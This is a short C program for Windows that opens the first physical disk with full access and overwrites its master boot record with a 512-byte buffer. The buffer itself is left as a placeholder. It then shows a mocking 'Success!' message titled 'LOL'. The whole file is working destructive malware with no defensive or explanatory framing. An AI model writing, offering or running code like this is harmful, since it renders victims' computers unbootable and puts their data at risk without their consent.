#include <Windows.h>

const unsigned char MBR_Data[512] = { /*MBR Data*/ };

INT WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE PrevInstance, _In_ PWSTR szCmdLine, _In_ INT nShowCmd) {
	DWORD BytesWritten;
	HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	WriteFile(hMBR, MBR_Data, 512, &BytesWritten, NULL);
	CloseHandle(hMBR);

	MessageBoxW(NULL, L"Success!", L"LOL", MB_OK | MB_ICONINFORMATION);
}